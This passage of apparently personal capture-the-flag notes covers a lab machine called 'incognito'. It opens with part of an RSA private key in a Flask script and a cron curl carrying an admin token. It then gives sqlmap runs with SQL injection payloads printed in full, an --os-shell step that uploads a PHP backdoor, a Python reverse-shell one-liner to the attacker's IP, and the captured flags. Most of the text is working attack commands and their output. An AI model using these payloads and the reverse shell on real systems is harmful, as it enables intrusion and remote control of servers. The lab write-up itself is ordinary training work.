GPsboZECgYAVK5KksKV2lJqjX7x1xPAuHoJEyYKiZJuw/uzAbwG2b4YxKTcTXhM6
ClH5GV7D5xijpfznQ/eZcTpr2f6mfZQ3roO+sah9v4H3LpzT8UydBU2FqILxck4v
QIaR6ed2y/NbuyJOIy7paSR+SlWT5G68FLaOmRzBqYdDOduhl061ww==
-----END RSA PRIVATE KEY-----"""
    else:
        return "Only Talking to Root User"

if __name__=='__main__':
    app.run(port=1027)
root@incognito:~# cat req.sh
#!/bin/sh

curl http://127.0.0.1:1027/?admin=ScadfwerDSAd_343123ds123dqwe12

using pspy if someone already got root.txt and execute curl we can see and get 
just curling
2023/07/23 17:16:21 CMD: UID=0     PID=2247   | curl http://127.0.0.1:1027/?admin=ScadfwerDSAd_343123ds123dqwe12 

root@incognito:~# tty
/dev/pts/0
root@incognito:~# who
root     pts/0        2023-07-23 17:13 (10.8.19.103)
root@incognito:~# w
 17:17:31 up  1:07,  1 user,  load average: 0.00, 0.01, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
root     pts/0    10.8.19.103      17:13    1.00s  0.04s  0.00s w

doing with sqlmap

┌──(witty㉿kali)-[~/Downloads]
└─$ cat req_metamor.txt 
POST /admin/config.php HTTP/1.1
Host: 10.10.84.192
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 149
Origin: http://10.10.84.192
Connection: close
Referer: http://10.10.84.192/admin/
Upgrade-Insecure-Requests: 1

username=wittty

┌──(witty㉿kali)-[~/Downloads]
└─$ sqlmap -r req_metamor.txt --risk 3 --level 5 
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.7.2#stable}
|_ -| . [,]     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 13:20:09 /2023-07-23/

[13:20:09] [INFO] parsing HTTP request from 'req_metamor.txt'
[13:20:09] [INFO] testing connection to the target URL
[13:20:10] [INFO] testing if the target URL content is stable
[13:20:10] [ERROR] there was an error checking the stability of page because of lack of content. Please check the page request results (and probable errors) by using higher verbosity levels
[13:20:10] [INFO] testing if POST parameter 'username' is dynamic
[13:20:10] [WARNING] POST parameter 'username' does not appear to be dynamic
[13:20:11] [WARNING] heuristic (basic) test shows that POST parameter 'username' might not be injectable
[13:20:11] [INFO] testing for SQL injection on POST parameter 'username'
[13:20:11] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[13:20:25] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[13:20:27] [INFO] POST parameter 'username' appears to be 'OR boolean-based blind - WHERE or HAVING clause' injectable (with --string="tom")
[13:20:32] [INFO] heuristic (extended) test shows that the back-end DBMS could be 'MySQL' 

[13:22:28] [ERROR] user quit

[*] ending @ 13:22:28 /2023-07-23/

                                                                                                                
┌──(witty㉿kali)-[~/Downloads]
└─$ sqlmap -r req_metamor.txt -p username --risk 3 --level 5
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.7.2#stable}
|_ -| . [.]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 13:22:36 /2023-07-23/

[13:22:36] [INFO] parsing HTTP request from 'req_metamor.txt'
[13:22:36] [INFO] testing connection to the target URL
[13:22:36] [INFO] testing if the target URL content is stable
[13:22:37] [ERROR] there was an error checking the stability of page because of lack of content. Please check the page request results (and probable errors) by using higher verbosity levels
[13:22:37] [WARNING] heuristic (basic) test shows that POST parameter 'username' might not be injectable
[13:22:37] [INFO] testing for SQL injection on POST parameter 'username'
[13:22:37] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[13:22:51] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[13:22:53] [INFO] POST parameter 'username' appears to be 'OR boolean-based blind - WHERE or HAVING clause' injectable (with --string="tom")
[13:22:55] [INFO] heuristic (extended) test shows that the back-end DBMS could be 'MySQL' 
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
[13:23:03] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[13:23:04] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[13:23:04] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[13:23:04] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[13:23:05] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
[13:23:05] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
[13:23:05] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
[13:23:05] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
[13:23:06] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[13:23:06] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[13:23:06] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[13:23:06] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[13:23:06] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[13:23:07] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[13:23:07] [INFO] testing 'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[13:23:07] [INFO] testing 'MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)'
[13:23:08] [INFO] testing 'MySQL OR error-based - WHERE or HAVING clause (FLOOR)'
[13:23:08] [INFO] testing 'MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)'
[13:23:08] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (BIGINT UNSIGNED)'
[13:23:08] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (EXP)'
[13:23:08] [INFO] testing 'MySQL >= 5.6 error-based - Parameter replace (GTID_SUBSET)'
[13:23:08] [INFO] testing 'MySQL >= 5.7.8 error-based - Parameter replace (JSON_KEYS)'
[13:23:08] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
[13:23:08] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (UPDATEXML)'
[13:23:08] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (EXTRACTVALUE)'
[13:23:08] [INFO] testing 'Generic inline queries'
[13:23:08] [INFO] testing 'MySQL inline queries'
[13:23:08] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[13:23:09] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[13:23:09] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[13:23:09] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[13:23:09] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
[13:23:10] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
[13:23:10] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[13:23:21] [INFO] POST parameter 'username' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
[13:23:21] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[13:23:21] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[13:23:27] [INFO] target URL appears to be UNION injectable with 3 columns
[13:23:27] [INFO] POST parameter 'username' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
[13:23:27] [WARNING] in OR boolean-based injection cases, please consider usage of switch '--drop-set-cookie' if you experience any problems during data retrieval
POST parameter 'username' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n
sqlmap identified the following injection point(s) with a total of 121 HTTP(s) requests:
---
Parameter: username (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause
    Payload: username=-5828" OR 4017=4017-- zyHy

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=wittty" AND (SELECT 9191 FROM (SELECT(SLEEP(5)))BzpJ)-- duDC

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: username=wittty" UNION ALL SELECT NULL,NULL,CONCAT(0x7162717071,0x6c5a624874524c6d6d66577871475949466b7a715458694f71456d666a504f4454527a525a43616f,0x7171787a71)-- -
---
[13:23:38] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 18.04 (bionic)
web application technology: Apache 2.4.29
back-end DBMS: MySQL >= 5.0.12
[13:23:40] [INFO] fetched data logged to text files under '/home/witty/.local/share/sqlmap/output/10.10.84.192'

[*] ending @ 13:23:40 /2023-07-23/

username=wittty" UNION ALL SELECT NULL,NULL,CONCAT(0x7162717071,0x6c5a624874524c6d6d66577871475949466b7a715458694f71456d666a504f4454527a525a43616f,0x7171787a71)-- -

3 cols and third is writable like we did

┌──(witty㉿kali)-[~/Downloads]
└─$ sqlmap -r req_metamor.txt -p username --risk 3 --level 5 --os-shell
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.7.2#stable}
|_ -| . [(]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 13:24:57 /2023-07-23/

[13:24:57] [INFO] parsing HTTP request from 'req_metamor.txt'
[13:24:58] [INFO] resuming back-end DBMS 'mysql' 
[13:24:58] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: username (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause
    Payload: username=-5828" OR 4017=4017-- zyHy

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=wittty" AND (SELECT 9191 FROM (SELECT(SLEEP(5)))BzpJ)-- duDC

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: username=wittty" UNION ALL SELECT NULL,NULL,CONCAT(0x7162717071,0x6c5a624874524c6d6d66577871475949466b7a715458694f71456d666a504f4454527a525a43616f,0x7171787a71)-- -
---
[13:24:58] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 18.04 (bionic)
web application technology: Apache 2.4.29
back-end DBMS: MySQL >= 5.0.12
[13:24:58] [INFO] going to use a web backdoor for command prompt
[13:24:58] [INFO] fingerprinting the back-end DBMS operating system
[13:24:58] [INFO] the back-end DBMS operating system is Linux
which web application language does the web server support?
[1] ASP
[2] ASPX
[3] JSP
[4] PHP (default)
> 4
do you want sqlmap to further try to provoke the full path disclosure? [Y/n] n
[13:25:37] [WARNING] unable to automatically retrieve the web server document root
what do you want to use for writable directory?
[1] common location(s) ('/var/www/, /var/www/html, /var/www/htdocs, /usr/local/apache2/htdocs, /usr/local/www/data, /var/apache2/htdocs, /var/www/nginx-default, /srv/www/htdocs, /usr/local/var/www') (default)
[2] custom location(s)
[3] custom directory list file
[4] brute force search
> 4
[13:25:40] [INFO] using generated directory list: /var/www,/var/www/html,/var/www/htdocs,/var/www/httpdocs,/var/www/php,/var/www/public,/var/www/src,/var/www/site,/var/www/build,/var/www/web,/var/www/data,/var/www/sites/all,/var/www/www/build,/usr/local/apache,/usr/local/apache/html,/usr/local/apache/htdocs,/usr/local/apache/httpdocs,/usr/local/apache/php,/usr/local/apache/public,/usr/local/apache/src,/usr/local/apache/site,/usr/local/apache/build,/usr/local/apache/web,/usr/local/apache/www,/usr/local/apache/data,/usr/local/apache/sites/all,/usr/local/apache/www/build,/usr/local/apache2,/usr/local/apache2/html,/usr/local/apache2/htdocs,/usr/local/apache2/httpdocs,/usr/local/apache2/php,/usr/local/apache2/public,/usr/local/apache2/src,/usr/local/apache2/site,/usr/local/apache2/build,/usr/local/apache2/web,/usr/local/apache2/www,/usr/local/apache2/data,/usr/local/apache2/sites/all,/usr/local/apache2/www/build,/usr/local/www/apache22,/usr/local/www/apache22/html,/usr/local/www/apache22/htdocs,/usr/local/www/apache22/httpdocs,/usr/local/www/apache22/php,/usr/local/www/apache22/public,/usr/local/www/apache22/src,/usr/local/www/apache22/site,/usr/local/www/apache22/build,/usr/local/www/apache22/web,/usr/local/www/apache22/www,/usr/local/www/apache22/data,/usr/local/www/apache22/sites/all,/usr/local/www/apache22/www/build,/usr/local/www/apache24,/usr/local/www/apache24/html,/usr/local/www/apache24/htdocs,/usr/local/www/apache24/httpdocs,/usr/local/www/apache24/php,/usr/local/www/apache24/public,/usr/local/www/apache24/src,/usr/local/www/apache24/site,/usr/local/www/apache24/build,/usr/local/www/apache24/web,/usr/local/www/apache24/www,/usr/local/www/apache24/data,/usr/local/www/apache24/sites/all,/usr/local/www/apache24/www/build,/usr/local/httpd,/usr/local/httpd/html,/usr/local/httpd/htdocs,/usr/local/httpd/httpdocs,/usr/local/httpd/php,/usr/local/httpd/public,/usr/local/httpd/src,/usr/local/httpd/site,/usr/local/httpd/build,/usr/local/httpd/web,/usr/local/httpd/www,/usr/local/httpd/data,/usr/local/httpd/sites/all,/usr/local/httpd/www/build,/var/www/nginx-default,/var/www/nginx-default/html,/var/www/nginx-default/htdocs,/var/www/nginx-default/httpdocs,/var/www/nginx-default/php,/var/www/nginx-default/public,/var/www/nginx-default/src,/var/www/nginx-default/site,/var/www/nginx-default/build,/var/www/nginx-default/web,/var/www/nginx-default/www,/var/www/nginx-default/data,/var/www/nginx-default/sites/all,/var/www/nginx-default/www/build,/srv/www,/srv/www/html,/srv/www/htdocs,/srv/www/httpdocs,/srv/www/php,/srv/www/public,/srv/www/src,/srv/www/site,/srv/www/build,/srv/www/web,/srv/www/data,/srv/www/sites/all,/srv/www/www/build
use any additional custom directories [Enter for None]: 
[13:25:42] [WARNING] unable to automatically parse any web server path
[13:25:42] [INFO] trying to upload the file stager on '/var/www/' via LIMIT 'LINES TERMINATED BY' method
[13:25:43] [WARNING] unable to upload the file stager on '/var/www/'
[13:25:43] [INFO] trying to upload the file stager on '/var/www/' via UNION method
[13:25:44] [WARNING] expect junk characters inside the file as a leftover from UNION query
[13:25:44] [WARNING] it looks like the file has not been written (usually occurs if the DBMS process user has no write privileges in the destination path)
[13:25:45] [INFO] trying to upload the file stager on '/var/www/admin/' via LIMIT 'LINES TERMINATED BY' method
[13:25:46] [WARNING] unable to upload the file stager on '/var/www/admin/'
[13:25:46] [INFO] trying to upload the file stager on '/var/www/admin/' via UNION method
[13:25:46] [WARNING] it looks like the file has not been written (usually occurs if the DBMS process user has no write privileges in the destination path)
[13:25:48] [INFO] trying to upload the file stager on '/var/www/html/' via LIMIT 'LINES TERMINATED BY' method
[13:25:49] [WARNING] unable to upload the file stager on '/var/www/html/'
[13:25:49] [INFO] trying to upload the file stager on '/var/www/html/' via UNION method
[13:25:49] [INFO] the remote file '/var/www/html/tmpueheq.php' is larger (707 B) than the local file '/tmp/sqlmapnvxwjkyb406281/tmp0hsarfhi' (705B)
[13:25:50] [INFO] the file stager has been successfully uploaded on '/var/www/html/' - http://10.10.84.192:80/tmpueheq.php
[13:25:51] [INFO] the backdoor has been successfully uploaded on '/var/www/html/' - http://10.10.84.192:80/tmpbqcuy.php
[13:25:51] [INFO] calling OS shell. To quit type 'x' or 'q' and press ENTER
os-shell> id
do you want to retrieve the command standard output? [Y/n/a] 
command standard output: 'uid=33(www-data) gid=33(www-data) groups=33(www-data)'

os-shell> python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.19.103",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'

┌──(witty㉿kali)-[~/Downloads]
└─$ rlwrap nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.8.19.103] from (UNKNOWN) [10.10.84.192] 56436
www-data@incognito:/var/www/html$ :)


```

![[Pasted image 20230723115224.png]]

user.txt

*4ce794a9d0019c1f684e07556821e0b0*

root.txt  

*7ffca2ec63534d165525bf37d91b4ff4*

[[Jacob the Boss]]